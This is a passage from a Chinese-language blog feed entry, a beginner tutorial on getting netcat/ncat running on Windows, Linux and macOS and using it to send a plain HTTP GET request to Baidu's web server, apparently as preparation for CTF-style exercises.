或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">此处</a> (github链接)下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="/download/ncat.zip">ncat.zip</a></p><blockquote><p>注：nc/ncat 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。ncat 是由 Nmap 项目开发的“重置版的 Netcat”。</p></blockquote><h4 id="Q-我的杀毒软件报毒怎么办"><a href="#Q-我的杀毒软件报毒怎么办" class="headerlink" title="Q:我的杀毒软件报毒怎么办"></a>Q:我的杀毒软件报毒怎么办</h4><p>如果你不相信此来源，也可以下载 nmap（一个网络探测、扫描工具），它会附带一个 ncat。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 nc 的目录中打开命令提示符或 PowerShell。</p><img src="/article/Netcat/explorer-1024x510.png" class="" loading="lazy"><h6 id="在-Windows-资源管理器中打开命令提示符或-PowerShell"><a href="#在-Windows-资源管理器中打开命令提示符或-PowerShell" class="headerlink" title="在 Windows 资源管理器中打开命令提示符或 PowerShell"></a>在 Windows 资源管理器中打开命令提示符或 PowerShell</h6><p>可以直接在<code>ncat.exe</code>所在目录，按住<code>Shift+鼠标右键</code>点击<code>在此处打开Powershell窗口</code>输入<code>ncat</code></p><p>或者，你也可以在开始菜单 -&gt; Windows 系统中打开命令提示符，或者在开始菜单 -&gt; Windows PowerShell 中打开 PowerShell，也可以按住<code>win标+R</code>弹出<code>运行</code>窗口输入<code>cmd</code>，然后使用 cd 命令转移到对应的目录：输入 cd 文件夹名 可以让你转移到对应的文件夹，输入 cd .. 可以让你转移到上面一层目录。使用 dir 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。</p><p>当跳转到你存放 nc 的文件夹后：</p><ul><li>如果你使用的是 PowerShell（蓝色背景），输入 ./ncat（根据 nc 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符（黑色背景），输入 ncat（根据 nc 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。</p><img src="/article/Netcat/image-20210220172523253.png" class="" title="nc" loading="lazy"><h6 id="成功运行-ncat"><a href="#成功运行-ncat" class="headerlink" title="成功运行 ncat"></a>成功运行 ncat</h6><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>打开「终端」，输入 <code>nc</code>。</p><pre class="language-none"><code class="language-none">$ ncusage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]  [-s source_ip_address] [-w timeout] [-X proxy_version]  [-x proxy_address[:port]] [hostname] [port[s]]</code></pre><p>出现了类似上面的输出，说明运行成功了。</p><img src="/article/Netcat/image-20210220170815879.png" class="" title="image-20210220170815879" loading="lazy"><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在我们使用浏览器上网的时候，我们和服务器使用了 HTTP 协议进行连接。关于 HTTP 协议的更多细节，你需要自己上网搜索。一般来说，默认是 80 端口。</p><p>我们可以使用 nc，尝试一次与网页服务器的连接，以百度为例。</p><p>输入 <code>nc www.baidu.com 80</code>（或者 <code>ncat www.baidu.com 80</code>，或者 <code>./ncat www.baidu.com 80</code>，请根据以上的介绍自行修改），程序会等待你的输入。</p><p>输入 GET / HTTP/1.0。这表示，我们使用 HTTP/1.0 这个协议版本，用 GET 的方式请求根 /。输入<strong>两下</strong>回车，代表我们的 HTTP 请求完成。如果你的网络畅通，百度的网页服务器会立刻返回大量信息，可以自行搜索，了解它们的含义。现在，你成功（在不使用浏览器的情况下）完成了一次与百度网站的连接！</p><img src="/article/Netcat/image-20210220172713535.png" class="" title="nc success" loading="lazy"><h6 id="内容可能不同，返回类似即表示成功"><a href="#内容可能不同，返回类似即表示成功" class="headerlink" title="内容可能不同，返回类似即表示成功"></a>内容可能不同，返回类似即表示成功</h6><p>如果你成功了，那么你可以开始愉快地完成我们的题目了！</p><hr><p>end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;这里是中国科技大学-taoky-写的一篇文章-nc是什么&quot;&gt;&lt;a href=&quot;#这里是中国科技大学-taoky-写的一篇文章-nc是什么&quot; class=&quot;headerlink&quot; title=&quot;这里是中国科技大学@taoky 写的一篇文章: nc是什么?&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="菜鸡教程" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="Netcat" scheme="https://err0r.top/tags/Netcat/"/>
    
  </entry>
  
</feed>
